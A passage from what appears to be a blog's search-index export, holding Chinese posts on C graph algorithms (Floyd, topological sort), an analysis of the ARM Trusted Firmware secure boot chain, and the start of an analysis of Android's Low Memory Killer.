32767) { printf(&quot;%2d[%d]-&gt;&quot;, p-&gt;adjVer, p-&gt;weiLGht); } p = p-&gt;nextEdLGe; } printf(&quot; NULL\\n&quot;); }}//输出邻接矩阵void displayAdjMat(MatGraph MG) { int i, j; for (i = 0; i &lt; MAXV; i++) { for (j = 0; j &lt; MAXV; j++) { if (MG.adjMat[i][j] == 0) { printf(&quot;%4s&quot;, &quot;0&quot;); } else if (MG.adjMat[i][j] == 32767) { printf(&quot;%4s&quot;, &quot;∞&quot;); } else { printf(&quot;%4d&quot;, MG.adjMat[i][j]); } } printf(&quot;\\n&quot;); }}//邻接表转换为邻接矩阵void ListToMat(ListGraph* LG, MatGraph&amp; MG) { int i, j; EdgeNode* p; for (i = 0; i &lt; MAXV; i++) { for (j = 0; j &lt; MAXV; j++) { MG.adjMat[i][j] = 0; } } for (i = 0; i &lt; LG-&gt;n; i++) { p = LG-&gt;adjList[i].firstEdLGe; while (p != NULL) { MG.adjMat[i][p-&gt;adjVer] = p-&gt;weiLGht; p = p-&gt;nextEdLGe; } } MG.n = LG-&gt;n; MG.e = LG-&gt;e;}//输出多源最短路径void displayPath(MatGraph MG, int A[MAXV][MAXV], int path[MAXV][MAXV]) { int i, j, k; int s; int aPath[MAXV]; //存放一条最短路径（逆向） int d; //顶点个数 for (i = 0; i &lt; MG.n; i++) { for (j = 0; j &lt; MG.n; j++) { if (A[i][j] != INF &amp;&amp; i != j) { //若顶点 i 和 顶点 j 之间存在路径 printf(&quot;从 %d 到 %d 的路径为：&quot;, i, j); k = path[i][j]; d = 0; aPath[d] = j; //路径上添加终点 while (k != -1 &amp;&amp; k != i) { //路劲上添加中间点 d++; aPath[d] = k; k = path[i][k]; } d++; aPath[d] = i; //路径上添加起点 printf(&quot;%d&quot;, aPath[d]); //输出起点 for (s = d - 1; s &gt;= 0; s--) { //输出路径上其他顶点 printf(&quot;-&gt;%d&quot;, aPath[s]); } printf(&quot;\\t\\t&quot;); printf(&quot;路径长度为：%d\\n&quot;, A[i][j]); } } }}//Floyd算法void Floyd(MatGraph MG) { int i, j, k; int A[MAXV][MAXV]; int path[MAXV][MAXV]; for (i = 0; i &lt; MG.n; i++) { for (j = 0; j &lt; MG.n; j++) { A[i][j] = MG.adjMat[i][j]; if (i != j &amp;&amp; MG.adjMat[i][j] &lt; INF) { path[i][j] = i; //顶点 i 到顶点 j 有边时 } else { path[i][j] = -1; //顶点 i 到顶点 j 无边时 } } } for (k = 0; k &lt; MG.n; k++) { //一次考察所有顶点 for (i = 0; i &lt; MG.n; i++) { for (j = 0; j &lt; MG.n; j++) { if (A[i][j] &gt; A[i][k] + A[k][j]) { A[i][j] = A[i][k] + A[k][j]; //修改最短路径长度 path[i][j] = path[k][j]; //修改最短路径 } } } } displayPath(MG, A, path); //输出最短路径}int main() { ListGraph* LG; MatGraph MG; int array[MAXV][MAXV] = { { 0, 4, 6, 6,INF,INF,INF}, {INF, 0, 1,INF, 7,INF,INF}, {INF,INF, 0,INF, 6, 4,INF}, {INF,INF, 2, 0,INF, 5,INF}, {INF,INF,INF,INF, 0,INF, 6}, {INF,INF,INF,INF, 1, 0, 8}, {INF,INF,INF,INF,INF,INF, 0} }; int e = 12; createAdjListGraph(LG, array, MAXV, e); displayAdjList(LG); printf(&quot;\\n&quot;); ListToMat(LG, MG); displayAdjMat(MG); printf(&quot;\\n&quot;); Floyd(MG); printf(&quot;\\n&quot;); return 0;} 结果: 参考文章 1 参考文章 2 # 拓扑排序 # 原理 从 AOV 网中选择一个没有前驱的顶点并输出. 从网中删除该顶点和所有以它为起点的有向边. 重复直至 AOV 网为空或当前网中不存在无前驱的顶点为止。后一种情况说明有向图中必然存在环. # 栈实现拓扑排序（邻接表实现） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;stack&gt;#include &lt;cstring&gt;using namespace std;#define MAX_VERTEX_NUM 26typedef struct ArcNode { int adjvex; struct ArcNode *nextarc; ArcNode() { nextarc = NULL; }} ArcNode; //结点typedef struct VNode { int data; ArcNode *firstarc; VNode() { firstarc = NULL; }} VNode, AdjList[MAX_VERTEX_NUM];typedef struct { AdjList vertices; int vexnum, arcnum;} ALGraph;bool TopologicalSort(ALGraph G, int *indegree) { stack&lt;int&gt; s; //初始化栈 int i, k; for (i = 1; i &lt; G.vexnum + 1; i++) { if (!indegree[i]) s.push(i); //入度为0的顶点入栈 } int count = 0; //记录当前已经输出的顶点数 ArcNode *p; while (!s.empty()) { i = s.top(); s.pop(); cout &lt;&lt; G.vertices[i].data &lt;&lt; &quot;-&gt;&quot;; count++; for (p = G.vertices[i].firstarc; p; p = p-&gt;nextarc) { k = p-&gt;adjvex; indegree[k]--; //将所有指向i的顶点的入度减一，并且将入度为0的顶点压入栈s if (!indegree[k]) s.push(k); } } if (count &lt; G.vexnum) return false; return true;}int main() { int i; ALGraph g; cout &lt;&lt; &quot;载入图中...&quot; &lt;&lt; endl; ifstream fin(&quot;in.txt&quot;); fin &gt;&gt; g.vexnum &gt;&gt; g.arcnum; for (i = 1; i &lt; g.vexnum + 1; i++) g.vertices[i].data = i; int b, e; ArcNode *p; int *indegree = new int[g.vexnum + 1]; //注意 int *a=new int(n); 申请一个整型变量空间，赋初值为n，并定义一个整型指针a指向该地址空间 //int *indegree=(int *)malloc(sizeof(int)*(g.vexnum+1)); memset(indegree, 0, sizeof(int) * (g.vexnum + 1)); for (i = 1; i &lt; g.arcnum + 1; i++) { fin &gt;&gt; b &gt;&gt; e; cout &lt;&lt; &quot;第&quot; &lt;&lt; i &lt;&lt; &quot;条边：&quot; &lt;&lt; b &lt;&lt; &quot;-&gt;&quot; &lt;&lt; e &lt;&lt; endl; p = new ArcNode(); p-&gt;adjvex = e; p-&gt;nextarc = g.vertices[b].firstarc; g.vertices[b].firstarc = p; indegree[e]++; } if (TopologicalSort(g, indegree)) cout &lt;&lt; &quot;正常完成！&quot; &lt;&lt; endl; else cout &lt;&lt; &quot;该有向图有回路！&quot; &lt;&lt; endl; return 0;} 测试数据，新建 in.txt 文件输入内容 1）有环 4 4 1 2 2 3 3 4 4 2 2）无环 12 16 1 2 1 3 2 3 1 4 3 5 4 5 11 6 5 7 3 7 3 8 6 8 9 10 9 11 9 12 10 12 1 12 结果: 参考文章 https://cloud.tencent.com/developer/article/1569368","link":"/2022/02/17/%E3%80%90%E7%8E%8B%E9%81%93%E8%80%83%E7%A0%94%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%20%E3%80%91%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95%E4%BB%A3%E7%A0%81%E5%A4%8D%E4%B9%A0%E6%80%BB%E7%BB%93%20C%E8%AF%AD%E8%A8%80(%E6%A0%91%E5%92%8C%E5%9B%BE%EF%BC%89/"},{"title":"arm-trusted-firmware可信启动机制","text":"ATF 可信启动调研 # ARM 安全技术（ATF 的可信启动） # 一、目标 本文主要针对 ATF 的可信启动进行分析，可信机制主要位于代码的 BL2 文件夹中，目录结构如下： 为便于后续分析给出 ATF 加载流程，给出官网中一个直观的流程图： 另外 ATF 固件源码整体架构如下： # 二、核心服务原理分析 # （一）安全启动与信任链 安全启动是建立系统信任链（Chain of Trust）的基础。信任链（Chain of Trust）是基于根信任（Root of trust）创建的， 而根信任的实现是基于两种技术：不可修改的 bootloader 和不可被修改的公钥。公钥通常存放在 OTP（One-Time-Programmable）内存中， bootloader 同常存储在 ROM 中或者不可修改的 Flash 内存中。 # （二）安全启动流程图 为了便于后续对代码的理解分析，这里先给出安全启动流程图 # 说明： # arch 初始化 对于 AArch64： BL2 执行 normal world 和后续阶段所需的最小架构初始化。 通过清零 CPACR.FPEN 位，使 EL1 和 EL0 可以访问 SIMD 寄存器。 # Platform 初始化 BL2 主要执行如下初始化步骤： 1、初始化 console (PL101).（尽管在 bl1 时已经初始化过一次） 2、初始化和配置储存设备驱动，用于加载后续的 bl。 3、使能 MMU ，map the memory，访问权限. 4、平台安全设置，相关组件（寄存器，外设，地址等）的访问控制 5、为 BL3 阶段的 image 保留内存空间。 6、为 BL3 阶段的 image 定义可用内存地址范围。 7、如果 BL1 使用 TB_FW_CONFIG dynamic configuration file (保存在 arg0) , 解析配置参数 # image load BL2 通过查找 image list 的方式加载 image，并且将这个 list 传递给下一个 BL 镜像。 平台实现方法提供的可加载 image list 还可以包含动态配置文件。这个配置文件可以根据需要在 bl2_plat_handle_post_image_load（）函数中进行解析。 通过更新此函数中的相应 ep 信息，可以将这些配置文件作为参数传递给下一个 Boot Loader 阶段。 # SCP_BL2 image load BL2 将可选的 SCP_BL2 镜像从平台存储设备加载到特定的安全内存区域。 SCP_BL2 的后续处理是特定于具体平台的，需要自行实现。 例如，Arm Juno ，BL2 先把 SCP_BL2 加载到 trust sram，再使用 Boot Over MHU (BOM) 协议，把 SCP_BL2 加载到 SCP 的内部 RAM 之后，SCP 运行 SCP_BL2，并给 AP 发出 signals，通知 BL2 继续执行。 # Load EL3 software BL2 从平台存储设备加载 EL3 runtime software 到 trusted SRAM. 如果内存空间不够或者镜像不存在去，则 assert 停止运行。 # AArch64(Secure-EL1 payload) image load BL2 将可选的 BL32 镜像从平台存储设备加载到特定于平台的安全存储区域。BL32 镜像在安全世界中执行。BL2 依靠 BL31 将控制权限传递给 BL32（如果存在）。 因此，BL2 也会使用 BL32 镜像的 entrypoint。 用于进入 BL32 的 Saved Processor Status Register（SPSR）的值不是由 BL2 确定的，它由 BL31 内的 Secure-EL1 Payload Dispatcher (SPD) 初始化，SPD 负责管理与 BL32 的交互。此信息将传递给 BL31。 # BL33(Non-trusted Fireware) image load BL2 将 BL33 镜像（e.g. UEFI or other test or boot software）从平台存储设备加载到由平台定义的非安全内存中。 一旦安全状态初始化完成，BL2 依靠 EL3 Runtime Software 将控制权传递给 BL33。 因此，BL2 使用正常世界的镜像入口和保存程序状态寄存器（SPSR）填充平台指定的存储区域。entrypoint 是 BL33 镜像的加载地址。 SPSR 按照 PSCI PDD 中的规定确定（PSCI 5.13 节）。 此信息将传递给 EL3runtime software。 # AArch64 BL31(EL3 Runtime Software) execution BL2 执行继续如下： BL2 通过产生 SMC 异常将控制权传递回 BL1，并给 BL1 提供 BL31 入口点。 SMC 异常由 BL1 阶段 install 的 SMC exception handler 来处理。 BL1 关闭 MMU 并刷 Cache。清 SCTLR_EL3.M/ I / C 位，将 D-cache 刷新到 point of coherency 并使 TLB 无效。 BL1 在 EL3 的指定入口地址将控制权传递给 BL31。 # 三、源代码分析 # （一）BL1（Trusted Boot ROM）分析 BL1 启动最早的 ROM，是在 CPU 的 ROM 里不是和 BIOS 一起，是一起的信任根。BL1 主要目的是建立 Trusted SRAM、exception vector、初始化串口 console 等等。然后找到并验证 BL2（验签 CSF 头），然后跳过去。 入口点:bl1_entrypoint.S: 123456789func bl1_entrypoint .... bl bl1_early_platform_setup bl bl1_plat_arch_setup .... bl bl1_main .... b el3_exitendfunc bl1_entrypoint # （二）BL2（Trusted Boot Firmware）分析 # 1、功能概要 BL2 主要负责对其他所有 BL 进行认证和加载，并执行 BL31, 该函数主要实现将 BL3x 的 image 加载 RAM 中，并通过 smc 调用执行 BL1 中指定的 smc handle 将 CPU 的全向交给 BL31。 # 2、主过程 各部分代码分析已在注释中给出 # BL2_entrypoint.S BL2 入口位于 bl2/aarch64/bl2_entrypoint.S 中，BL2_entrypoint 是 BL2 的入口，前半部分主要进行一系列初始化工作，然后通过 BL2_main () 加载 BL3x 镜像到 RAM 中，最后通过 SMC 调用执行 BL1 中指定的 smc handler 将 CPU 执行权交给 BL31。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778 .globl bl2_entrypointfunc bl2_entrypoint mov x20, x1 /* x1保存了内存布局信息 */ /* 设置异常处理函数 */ adr x0, early_exceptions msr vbar_el1, x0 isb /* --------------------------------------------- * 使能异常 * --------------------------------------------- */ msr daifclr, #DAIF_ABT_BIT /* --------------------------------------------- * 使能指令缓存，使能堆栈数据访问对齐检查 * --------------------------------------------- */ mov x1, #(SCTLR_I_BIT | SCTLR_A_BIT | SCTLR_SA_BIT) mrs x0, sctlr_el1 orr x0, x0, x1 msr sctlr_el1, x0 isb /* --------------------------------------------- * 失效内存 * --------------------------------------------- */ adr x0, __RW_START__ adr x1, __RW_END__ sub x1, x1, x0 bl inv_dcache_range /* --------------------------------------------- * BSS内存初始化 * --------------------------------------------- */ ldr x0, =__BSS_START__ ldr x1, =__BSS_SIZE__ bl zeromem16#if USE_COHERENT_MEM ldr x0, =__COHERENT_RAM_START__ ldr x1, =__COHERENT_RAM_UNALIGNED_SIZE__ bl zeromem16#endif /* -------------------------------------------- * 设置SP指针 * -------------------------------------------- */ bl plat_set_my_stack /* --------------------------------------------- * 串口初始化，更新内存布局信息，并初始化页表使能mmu * --------------------------------------------- */ mov x0, x20 bl bl2_early_platform_setup bl bl2_plat_arch_setup /* --------------------------------------------- * 跳转到主函数（通过SMC执行下一级BL不会返回） * --------------------------------------------- */ bl bl2_main /* --------------------------------------------- * 下面的代码不会执行 * --------------------------------------------- */ no_ret plat_panic_handlerendfunc bl2_entrypoint # BL2_main bl2_main 为 bl2 的主程序，位于 bl2/bl2_main.c 中，安全启动的最重要两步在这个函数中完成：初始化硬件和找到 BL31。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071void bl2_main(void){ entry_point_info_t *next_bl_ep_info; /* 输出提示信息 */ NOTICE(&quot;BL2: %s\\n&quot;, version_string); NOTICE(&quot;BL2: %s\\n&quot;, build_message); /* Perform remaining generic architectural setup in S-EL1 */ /* 初始化，这里开启FP/SIMD的访问权限 */ bl2_arch_setup();#if PSA_FWU_SUPPORT fwu_init();#endif /* PSA_FWU_SUPPORT */ crypto_mod_init(); //初始化加密库，加密库可以用于校验签名和哈希 /* Initialize authentication module */ auth_mod_init(); //初始化认证模块 /* Initialize the Measured Boot backend */ bl2_plat_mboot_init(); //初始化 measured boot后端 /* Initialize boot source */ bl2_plat_preload_setup(); //初始化镜像解析模块（img_parser_mod），用于校验镜像完整性以及从镜像中提取内容 /*加载后续引导加载程序映像。*/ next_bl_ep_info = bl2_load_images(); /*拆除 Measured Boot 后端*/ bl2_plat_mboot_finish();#if !BL2_AT_EL3 &amp;&amp; !ENABLE_RME#ifndef __aarch64__ /* * 对于 AArch32 状态，BL1 和 BL2 共享 MMU 设置。 * 鉴于 BL2 不映射 BL1 区域，MMU 需要 * 被禁用以返回 BL1。 */ disable_mmu_icache_secure();#endif /* !__aarch64__ */ console_flush(); //控制台刷新#if ENABLE_PAUTH /* * 在运行下一个引导映像之前禁用指针身份验证 */ pauth_disable_el1();#endif /* ENABLE_PAUTH */ /* 调用smc指令，触发在bl1中设定的smc异常中断处理函数，跳转到bl31 */ smc(BL1_SMC_RUN_IMAGE, (unsigned long)next_bl_ep_info, 0, 0, 0, 0, 0, 0);#else /* if BL2_AT_EL3 || ENABLE_RME */ NOTICE(&quot;BL2: Booting &quot; NEXT_IMAGE &quot;\\n&quot;); print_entry_point_info(next_bl_ep_info); console_flush();#if ENABLE_PAUTH /* * 在运行下一个引导映像之前禁用指针身份验证 */ pauth_disable_el3();#endif /* ENABLE_PAUTH */ bl2_run_next_image(next_bl_ep_info);#endif /* BL2_AT_EL3 &amp;&amp; ENABLE_RME */} 下面依次对 bl2_main 中的安全模块进行分析： # crypto_mod_init() 主要初始化加密库，加密库可以用于校验签名和哈希，跟进 crypto_mod_init() 在 crypto_mod.h 中定义了 crypto_lib_desc_s 结构体 1234567891011121314151617typedef struct crypto_lib_desc_s { const char *name;/* 名称， */ void (*init)(void);/* 初始化方法 */ /* 校验签名的方法 */ int (*verify_signature)( void *data_ptr, unsigned int data_len, /* 要签名的数据 */ void *sig_ptr, unsigned int sig_len, /* 签名 */ void *sig_alg, unsigned int sig_alg_len, /* 签名算法 */ void *pk_ptr, unsigned int pk_len); /* 公钥 */ /* 校验哈希的方法 */ int (*verify_hash)( void *data_ptr, unsigned int data_len, /* 要计算哈希的数据 */ void *digest_info_ptr, unsigned int digest_info_len);/* 哈希值 */} crypto_lib_desc_t; 通过 REGISTER_CRYPTO_LIB 宏实现一个名为 crypto_lib_desc 类型为 crypto_lib_desc_t 结构体。宏实现如下: 1234567#define REGISTER_CRYPTO_LIB(_name, _init, _verify_signature, _verify_hash) \\ const crypto_lib_desc_t crypto_lib_desc = { \\ .name = _name, \\ .init = _init, \\ .verify_signature = _verify_signature, \\ .verify_hash = _verify_hash \\ } 此模块通过操作 crypto_lib_desc 变量，实现模块初始化、校验签名、校验哈希。函数声明如下： 1234567891011/* 模块初始化 */void crypto_mod_init(void);/* 校验签名 */int crypto_mod_verify_signature(void *data_ptr, unsigned int data_len, void *sig_ptr, unsigned int sig_len, void *sig_alg, unsigned int sig_alg_len, void *pk_ptr, unsigned int pk_len);/* 校验哈希值 */int crypto_mod_verify_hash(void *data_ptr, unsigned int data_len, void *digest_info_ptr, unsigned int digest_info_len); # auth_mod_init() auth_mod 实现了一个校验镜像的模型，此模型通过结构体 auth_img_desc_t 描述，跟进 auth_mod_init, 在 auth.mod.h 中定义了 auth_img_desc_s 结构体 12345678910111213141516typedef struct auth_img_desc_s { /* 镜像的ID,标志是哪一个镜像 */ unsigned int img_id; /* 镜像类型(Binary、证书等) */ img_type_t img_type; /* 父镜像，保存了认证当前镜像的公钥、哈希等 */ const struct auth_img_desc_s *parent; /* 认证当前镜像的方法 */ auth_method_desc_t img_auth_methods[AUTH_METHOD_NUM]; /* 用于校验子镜像的公钥、哈希等 */ auth_param_desc_t authenticated_data[COT_MAX_VERIFIED_PARAMS];} auth_img_desc_t; 并定义一个宏 REGISTER_COT ，用于注册 auth_img_desc_t 数组 1234#define REGISTER_COT(_cot) \\ const auth_img_desc_t *const cot_desc_ptr = \\ (const auth_img_desc_t *const)&amp;_cot[0]; \\ unsigned int auth_img_flags[sizeof(_cot)/sizeof(_cot[0])] auth_mod_verify_img 通过 img_id 访问 cot_desc_ptr 数组，找到对应的镜像描述符 auth_method_desc_t ，即可知道当前镜像的认证方式，访问父节点找到签名的公钥或哈希，即可认证当前镜像是否合法。在认证完当前镜像后，从镜像中解析出公钥哈希等放入当前的镜像描述符中，便于对下一级镜像校验 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273int auth_mod_verify_img(unsigned int img_id, void *img_ptr, unsigned int img_len){ const auth_img_desc_t *img_desc = NULL; const auth_method_desc_t *auth_method = NULL; void *param_ptr; unsigned int param_len; int rc, i; /* 根据img_id获取镜像描述符 */ img_desc = &amp;cot_desc_ptr[img_id]; /* 校验镜像完整性 */ rc = img_parser_check_integrity(img_desc-&gt;img_type, img_ptr, img_len); return_if_error(rc); /* 根据镜像描述符的仍正方式对镜像进行认证 */ for (i = 0 ; i &lt; AUTH_METHOD_NUM ; i++) { auth_method = &amp;img_desc-&gt;img_auth_methods[i]; switch (auth_method-&gt;type) { case AUTH_METHOD_NONE:/* 不需要认证 */ rc = 0; break; case AUTH_METHOD_HASH:/* 哈希认证 */ rc = auth_hash(&amp;auth_method-&gt;param.hash, img_desc, img_ptr, img_len); break; case AUTH_METHOD_SIG:/* 签名认证 */ rc = auth_signature(&amp;auth_method-&gt;param.sig, img_desc, img_ptr, img_len); break; case AUTH_METHOD_NV_CTR:/* Non-Volatile counter认证？ */ rc = auth_nvctr(&amp;auth_method-&gt;param.nv_ctr, img_desc, img_ptr, img_len); break; default: /* 未知认证类型，报错 */ rc = 1; break; } return_if_error(rc); } /* 从镜像中解析出公钥哈希等，以便对下一级镜像进行认证 */ for (i = 0 ; i &lt; COT_MAX_VERIFIED_PARAMS ; i++) { if (img_desc-&gt;authenticated_data[i].type_desc == NULL) { continue; } /* 通过镜像解析器从镜像中提取内容 */ rc = img_parser_get_auth_param(img_desc-&gt;img_type, img_desc-&gt;authenticated_data[i].type_desc, img_ptr, img_len, &amp;param_ptr, &amp;param_len); return_if_error(rc); /* 异常检查 防止从镜像中解析出的数据字节数大于镜像描述符中的字节数 出现内存访问溢出 */ if (param_len &gt; img_desc-&gt;authenticated_data[i].data.len) { return 1; } /* 把解析出的内容拷贝到镜像描述符中，便于解析下一级BL */ memcpy((void *)img_desc-&gt;authenticated_data[i].data.ptr, (void *)param_ptr, param_len); } /* 标记镜像以认证过 */ auth_img_flags[img_desc-&gt;img_id] |= IMG_FLAG_AUTHENTICATED; return 0;} # BL2_image_load_v2.c 该函数用来加载 bl3x 的 image 到 RAM 中，返回一个具有 image 入口信息的变量。smc handle 根据该变量跳转到 bl31 进行执行。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283struct entry_point_info_t *bl2_load_images(void){bl_params_t *bl2_to_next_bl_params;bl_load_info_t *bl2_load_info;const bl_load_info_node_t *bl2_node_info;int plat_setup_done = 0;int err;/** Get information about the images to load.*//* 获取bl3x image的加载和入口信息 */bl2_load_info = plat_get_bl_image_load_info();/* 检查返回的bl2_load_info中的信息是否正确 */assert(bl2_load_info);assert(bl2_load_info-&gt;head);assert(bl2_load_info-&gt;h.type == PARAM_BL_LOAD_INFO);assert(bl2_load_info-&gt;h.version &gt;= VERSION_2);/* 将bl2_load_info中的head变量的值赋值为bl2_node_info，即将bl31 image的入口信息传递給bl2_node_info变量 */bl2_node_info = bl2_load_info-&gt;head;/* 进入loop循环， */while (bl2_node_info) {/** Perform platform setup before loading the image,* if indicated in the image attributes AND if NOT* already done before.*//* 在加载特定的bl3x image到RAM之前先确定是否需要做平台的初始化 */if (bl2_node_info-&gt;image_info-&gt;h.attr &amp; IMAGE_ATTRIB_PLAT_SETUP) {if (plat_setup_done) {WARN(&quot;BL2: Platform setup already done!!\\n&quot;);} else {INFO(&quot;BL2: Doing platform setup\\n&quot;);bl2_platform_setup();plat_setup_done = 1;}}/* 对bl3x image进行电子验签，如果通过则执行加载操作 */if (!(bl2_node_info-&gt;image_info-&gt;h.attr &amp; IMAGE_ATTRIB_SKIP_LOADING)) {INFO(&quot;BL2: Loading image id %d\\n&quot;, bl2_node_info-&gt;image_id);err = load_auth_image(bl2_node_info-&gt;image_id,bl2_node_info-&gt;image_info);if (err) {ERROR(&quot;BL2: Failed to load image (%i)\\n&quot;, err);plat_error_handler(err);}} else {INFO(&quot;BL2: Skip loading image id %d\\n&quot;, bl2_node_info-&gt;image_id);}/* Allow platform to handle image information. *//* 可以根据实际需要更改，通过给定image ID来更改image的加载信息 */err = bl2_plat_handle_post_image_load(bl2_node_info-&gt;image_id);if (err) {ERROR(&quot;BL2: Failure in post image load handling (%i)\\n&quot;, err);plat_error_handler(err);}/* Go to next image */bl2_node_info = bl2_node_info-&gt;next_load_info;}/** Get information to pass to the next image.*//* 获取下一个执行的Image的入口信息，并且将以后会被执行的image的入口信息组合成链表 ,t通过判断image des中的ep_info.h.attr的值是否为（EXECUTABLE|EP_FIRST_EX）来确定接下来第一个被执行的image*/bl2_to_next_bl_params = plat_get_next_bl_params();assert(bl2_to_next_bl_params);assert(bl2_to_next_bl_params-&gt;head);assert(bl2_to_next_bl_params-&gt;h.type == PARAM_BL_PARAMS);assert(bl2_to_next_bl_params-&gt;h.version &gt;= VERSION_2);/* Flush the parameters to be passed to next image */plat_flush_next_bl_params();/* 返回下一个进入的image的入口信息,即bl31的入口信息 */return bl2_to_next_bl_params-&gt;head-&gt;ep_info;} # 四、分析结论 ​ 结合 ATF 整个信任链条建立的流程图，我们了解到可信启动中的安全模块和可信机制，从作为信任根的 BL1 开始，逐步进行初始化和加载镜像，最后来到 BL33，后面就是 OS 了。 最后引用一张 ATF 的 UEFI 启动流程进行更直观展示： 以上仅是对 ATF 可信启动机制的简要分析，而对于 ATF 的更深层次技术需要更多信息搜集和整理研究。 # 五、参考文章 https://zhuanlan.zhihu.com/p/391101179 https://github.com/hardenedlinux/embedded-iot_profile/blob/master/docs/arm64/arm-trusted-firmware 分析.md https://blog.csdn.net/puyoupuyou/article/details/109506419?spm=1001.2101.3001.6650.15&amp;utm_medium=distribute.pc_relevant.none-task-blog-2defaultBlogCommendFromBaiduRate-15.topblog&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2defaultBlogCommendFromBaiduRate-15.topblog&amp;utm_relevant_index=20","link":"/2022/04/20/ATF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E8%B0%83%E7%A0%94%E6%8A%A5%E5%91%8A/"},{"title":"Android-Low memory killer源码分析","text":"LMK 调研 # 一、目标 ​ 主要分析 Andoird 核心机制与服务中的 ——LMK 机制，低内存管理机制（根据需要杀死进程来释放需要的内存）。源码分析主要通过 http://androidxref.com/，Android 版本为 Marshmallow-Android 6.0.1_r10, 内核版本为 3.18，机制架构如下： 源码位置如下： 源代码名称 路径位置 lowmemorykiller.c /drivers/staging/android/lowmemorykiller.c lmkd.c /system/core/lmkd/lmkd.c ProcessList.java /frameworks/base/services/core/java/com/android/server/am/ProcessList.java ActivityManagerService.java /frameworks/base/services/core/java/com/android/server/am/ActivityManagerService.java # 二、核心服务原理分析 # （一） LMK 简介 为了防止剩余内存过低，Android 在内核空间采用 LMK(Low Memory Killer) 机制，LMK 是通过注册 shrinker 来触发低内存回收的，但是这个机制可能会拖慢 Shrinkers 内存扫描速度，已从内核 4.12 中移除，后续会采用用户空间的 LMKD + memory cgroups 机制。 进程刚启动时，ADJ 等于 INVALID_ADJ，当执行完 attachApplication ()，该进程的 curAdj 和 setAdj 不相等，则会触发执行 setOomAdj () 将该进程的节点 /proc/pid/oom_score_adj 写入 oomadj 的值。下图参数为 Android 原生阈值，当系统剩余空闲内存抵御某阈值（比如 147MB），则从 ADJ 大于或等于相应阈值（比如 900）的进程中，选择 ADJ 值最大的进程，如果存在多个 ADJ 相同的进程，则选择内存最大的进程。如下是 64 位机器，LMK 默认阈值图： # （二）lmkd ​ lmkd ，全称为 Low Memory Killer Daemon，用以监控正在运行的 Android 系统的内存) 状态，以及通过杀死最不重要进程来应对高内存压力，以保持系统在可接受的水平上运行。 过去，Android 使用内存 LMK 驱动程序来监控系统内存的压力，这是一种依赖于硬编码值的硬件机制。从 Kernel 4.12 开始，LMK 驱动程序从上游内核中移除，由应用空间的 lmkd 执行内存监控和进程终止任务。 Android 10 以及更高版本支持新的 lmkd 模式，它使用 PSI 监视器来检测内存压力。PSI 用以测量由于内存不足导致任务延迟的时间。由于这些岩石会直接影响到用户体验，因此它们代表了确定内存压力严重的便捷指标。PSI 监视器允许特权用户进程（例如 lmkd）指定这些延迟的阈值，然后订阅当突破阈值时来自 kernel 的事件。 # （三）原理分析 ​ 于 Linux 系统来说，底层内核的内存监控机制为 OOMKiller。一旦发现系统的可用内存达到临界值，OOM 的管理者就会自动回收内存。根据策略的不同，OOM 的处理手段略有差异。它的核心思想是按照优先级顺序，从低到高逐步杀掉进程，回收内存。优先级的设定策略一方面要考虑对系统的损害程度（例如系统的核心进程，优先级通常较高），另一方面也希望尽可能多地释放无用内存。一个合理的策略至少要综合一下几个因素：进程消耗的内存；进程占用的 CPU 时间；oom_adj（OOM 权重）。对于 Linux 内核中的 OOM Killer，内核所管理的进程都有一个衡量其 oom 权重的值，存储在 /proc//oom_adj 中。根据这一权重值以及其他若干因素，系统会实时给每个进程评分，以决定 OOM 应该杀死哪些进程。比如 oom_score 分数越低的进程，杀死的概率越小，或者说被杀死的时间越晚。 对于 Android 系统来说，我们常常在使用的过程中从一个应用返回到桌面，然后再打开其他的应用进行使用。而此时前一个应用会驻留在内存中，当再次打开该应用时就可以直接显示使用。通过这种方法可以提升用户体验以及提高应用打开速度。但是系统内存是有限的，不可能一直将全部应用驻留在系统内存中。基于 Linux 内核 OOM Killer 的核心思想，Android 系统扩展出了自己的内存监控体系。因为 Linux 下的杀死内存要等到系统资源快要不够用的时候才会产生效果。而 Android 实现了不同梯级的 Killer，名为 Low Memory Killer（LMK）。所以 Low Memory Killer 的作用就是当内存处于低水平时，杀死系统中余留的暂时还不使用的进程，来释放内存。 我们知道，从 Zygote 中孵化出来的进程都会记录在 ActivityManagerService.mLruProcesses 列表中，ActivityManagerService 的核心业务之一就是实时更新进程的状态，根据状态计算出进程对应的 OomAdj 值，这个值会传递到 kernel 中，在 kernel 中有一个低内存回收机制，在内存达到一定阈值时会触发清理 OomAdj 值高的进程，这就是 LMK 的工作原理。 用户在启动一个进程之后，通常伴随着启动一个 Activity 游览页面或者一个 Service 播放音乐等等，这个时候此进程的 adj 被 AMS 提高，LMK 就不会杀死这个进程，当这个进程要做的事情做完了，退出后台了，此进程的 adj 很快又被 AMS 降低。当需要杀死一个进程释放内存时，一般先根据当前手机剩余内存的状态，在 minfree 节点中找到当前等级，再根据这个等级去 adj 节点中找到这个等级应该杀掉的进程的优先级， 之后遍历所有进程并比较进程优先级 adj 与优先级阈值，并杀死优先级低于阈值的进程，达到释放内存的目的。 1234567891011121314151617181920212223242526272829303132333435![img](https://raw.githubusercontent.com/y1seco/blog_image/master/img/202205121659479.jpg) AMS负责了系统中四大组件的启动、切换、调度以及应用进程管理和调度工作。在应用程序的使用过程中，AMS会根据四大组件关键生命周期，在mLruProcesses中时时地设定对应进程的adj值（更新进程优先级），在内存低于阈值时，LMK会选择adj优先级最大（如果adj相等则选择同adj中内存占用最大）的进程杀掉，释放内存。总的来说，```Framework层通过调整adj的值和阈值数组，输送给kernel中的lmk，为lmk提供杀进程的原材料```，因为用户空间和内核空间相互隔离，就采用了文件节点进行通讯，用socket将adj的值与阈值数组传给lmkd(5.0之后不在由AMS直接与lmk通信，引入lmkd守护进程)，lmkd将这些值写到内核节点中。lmk通过读取这些节点，实现进程的kill。# 